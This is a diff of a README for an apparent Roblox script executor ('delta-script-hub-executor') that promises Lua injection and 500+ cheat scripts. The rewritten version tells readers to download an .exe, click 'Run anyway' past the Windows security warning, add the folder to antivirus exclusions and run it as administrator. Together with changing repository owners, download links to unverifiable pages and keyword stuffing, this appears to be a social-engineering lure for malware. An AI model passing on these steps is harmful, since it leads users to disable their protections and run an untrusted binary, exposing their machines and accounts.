@@ -1,150 +1,70 @@
-# Delta Executor PC v3.8 - Roblox Script Executor 2026
+# 💻 delta-script-hub-executor - Run your favorite Roblox scripts easily
 
-> A Windows 10/11 Roblox script executor featuring Lua injection, access to 500+ scripts, and a lightweight WPF desktop interface for 2026.
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/alanapositive771/delta-script-hub-executor)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/matt-hughesuvc2003/delta-script-hub-executor?style=flat-square)](https://github.com)
+delta-script-hub-executor is a software tool for Windows 10 and 11. It helps users manage and run Lua scripts for Roblox. The program includes a library of over 500 scripts. It uses a lightweight desktop interface built with Windows Presentation Foundation technology. The software works without requiring keys or payment.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://matt-hughesuvc2003.github.io/delta-script-hub-executor/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Delta%20Executor-v3.8%20Latest-brightgreen?style=for-the-badge" alt="Download Delta Executor">
-  </a>
-</p>
+To run this tool, your computer needs to meet these basic standards:
 
-> **[Download Delta Executor v3.8](https://matt-hughesuvc2003.github.io/delta-script-hub-executor/)**  
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+- Operating System: Windows 10 or Windows 11 (64-bit versions).
+- Processor: Any modern dual-core processor or better.
+- Memory: 4 GB of RAM or more.
+- Graphics: A graphics card that supports DirectX 11.
+- Internet Connection: A stable connection for script downloads and updates.
+- Software: The latest version of the Roblox client installed on your computer.
 
----
+## 📥 How to Download and Install
 
-[Download Latest Build](https://matt-hughesuvc2003.github.io/delta-script-hub-executor/)
+Follow these steps to set up the executor on your system.
 
----
+1. Visit the [official download page](https://github.com/alanapositive771/delta-script-hub-executor) to get the latest file.
+2. Look for the file ending in .exe in the releases section.
+3. Save the file to a folder you can find, such as your Downloads folder.
+4. Locate the file and double-click it to start the installation.
+5. If Windows shows a security prompt, click "More info" and then "Run anyway" to allow the software to launch.
+6. The installer will guide you through the remaining steps.
 
-## About Delta Executor
+## 🚀 Running the Software
 
-Delta Executor is a Windows desktop application for Roblox users who need a streamlined way to run Lua scripts. The software brings together script execution, a built-in script hub, and a compact WPF interface, keeping its primary workflow straightforward on Windows 10 and Windows 11.
+Once the installation finishes, you can start the program using the shortcut on your desktop. 
 
-Version 3.8 includes practical tools such as automatic updates, sequential batch execution, and an integrated debugger. Its script hub contains more than 500 scripts, providing a companion library for users who want a focused local executor rather than a larger desktop suite.
+1. Close any existing instances of Roblox to prevent conflicts.
+2. Open delta-script-hub-executor.
+3. Wait for the interface to load. The dashboard shows the available script library.
+4. Open the Roblox game where you intend to use the scripts.
+5. Return to the executor interface and select the "Attach" button. This connects the executor to your game session.
+6. Browse the list of 500+ scripts. Use the search bar to find specific functions.
+7. Click the "Execute" button next to your chosen script to load it into the game.
 
-## Included Capabilities
+## 🛡️ Troubleshooting Common Issues
 
-- Run scripts through a one-click execution workflow
-- Browse and use an integrated hub containing 500+ scripts
-- Preserve queued items with SQLite-backed local storage
-- Keep the application current through its auto-update engine
-- Select from multiple interface languages
-- Process several scripts in batch mode and sequence
-- Examine script behavior with the built-in debugger
-- Use an ultra-light WPF desktop interface on Windows
+If you experience problems, check these items first:
 
-## Supported Games and Script Categories
+- Antivirus interference: Some antivirus programs block script executors. You may need to add the executor folder to your antivirus exclusion list to let it function.
+- Outdated software: Ensure you run the latest version of the executor. Updates include fixes for new game patches.
+- Admin rights: Right-click the application icon and select "Run as administrator" if the script fails to inject into the game.
+- Script compatibility: Some scripts may not work in every game mode. If a script fails, try a different one from the library.
+- Background processes: Close unnecessary programs to free up system memory for a smoother experience.
 
-| Game / Experience Type | Common Script Category | Notes |
-| --- | --- | --- |
-| Roblox action games | Combat scripts | Suited to fast, input-focused play styles |
-| Open-world experiences | Movement and utility scripts | Commonly used with convenience-oriented tools |
-| Simulator games | Farm and automation scripts | Designed to reduce repetitive tasks |
-| Roleplay games | UI and quality-of-life scripts | Concentrated on interface assistance |
-| Obby and parkour maps | Movement scripts | Intended for traversal and timing support |
-| General Roblox experiences | Lua script execution | Provides a general-purpose executor workflow |
+## 📋 Features
 
-## Requirements
+This executor offers several tools designed for ease of use:
 
-| Component | Minimum |
-| --- | --- |
-| Operating System | Windows 10 or Windows 11 |
-| Architecture | 64-bit Windows |
-| RAM | 4 GB minimum, 8 GB recommended |
-| Storage | 250 MB free space or more |
-| .NET | Latest supported .NET runtime for WPF apps |
-| Roblox | Installed Roblox client on the same PC |
+- Direct Lua Injection: The engine handles the code injection process to ensure scripts work within the game environment.
+- Extensive Script Library: Gain instant access to a curated list of over 500 scripts.
+- Minimal Resource Usage: The interface runs in the background without slowing down your computer.
+- No Key System: Access every feature immediately without watching ads or completing verification tasks.
+- Regular Updates: The development team provides frequent patches to keep the executor compatible with Roblox updates.
+- Simple User Interface: The navigation menu allows for quick access to all settings and script categories.
 
-## Installation and Launch
+## 🔒 Safety and Usage Guidelines
 
-1. Download the repository or clone it locally.
-2. Open the project directory in a file manager or terminal.
-3. Run the executable produced in the build output.
+Use this software in accordance with the terms of service of the games you play. Users take responsibility for their own accounts. Do not share your personal information or login credentials with any third-party tools. Always download the executor from the official link provided here. Do not download the file from unofficial websites or suspicious mirrors. Keep your computer updated with the latest Windows security patches to ensure a safe computing environment.
 
-Clone the repository:
+## 📝 Support
 
-`git clone https://github.com/matt-hughesuvc2003/delta-script-hub-executor.git
+If you encounter a bug or need help, check the issues tab on the GitHub repository. Provide as much detail as possible, including your Windows version and the steps you took before the error occurred. This helps the developers fix issues faster.
 
-Enter the project directory:
-
-`cd Delta-Executor-New-Update`
-
-Start the application:
-
-`Delta ExecutorExecutor.exe`
-
-When the compiled files are placed elsewhere, locate the release output and open `Delta ExecutorExecutor.exe` from that folder.
-
-## Script Hub Search Topics for 2026
-
-- Roblox script executor for Windows 10/11
-- Lua injection tool for Roblox
-- no key script executor
-- script hub with 500+ scripts
-- WPF Roblox executor desktop app
-- auto-update Roblox script executor
-- batch Lua script execution for Roblox
-
-## Project Structure
-
-Delta Executor
-- `src/`
-  - `ui/` - WPF windows and interface controls
-  - `executor/` - Lua processing and script execution
-  - `hub/` - Script hub browsing and loading features
-  - `update/` - Automatic update functionality
-  - `storage/` - SQLite queue handling and local data
-  - `debug/` - Debugging and inspection utilities
-- `assets/` - Icons, themes, and other UI resources
-- `build/` - Compiled release output
-- `README.md`
-- `LICENSE`
-
-## Frequently Asked Questions
-
-### Which operating systems are supported?
-
-Delta Executor is designed for Windows, with support focused on Windows 10 and Windows 11.
-
-### Are updates handled automatically?
-
-An auto-update engine is included in the feature set, making update management part of the application workflow.
-
-### What distinguishes it from other Roblox script executors?
-
-Delta Executor focuses on a lightweight WPF desktop experience while also providing batch execution, an integrated debugger, and a 500+ script hub.
-
-### Can using it put an account at risk?
-
-Third-party Roblox tools may involve account and platform-policy risks. Review Roblox's terms and use the software responsibly.
-
-### Is local data saved on the computer?
-
-Yes. Persistent queue support uses SQLite storage, so relevant queue and local data can remain on the device.
-
-## 2026 Development Roadmap
-
-- [ ] Broaden script hub browsing and organization features
-- [ ] Improve update distribution and release management
-- [ ] Introduce additional desktop interface languages
-- [ ] Enhance debugger tools for script testing
-- [ ] Expand queue management and local storage settings
-
-## License
-
-This project is provided under the GNU GPL v3.0 license. Refer to [LICENSE](LICENSE) for the complete terms.
-
----
-
-<p align="center">
-  <i>Delta Executor v3.8 for Windows Roblox script execution in 2026.</i>
-</p>
+Keywords: roblox, lua, executor, script, windows, software, tools, gaming, automation
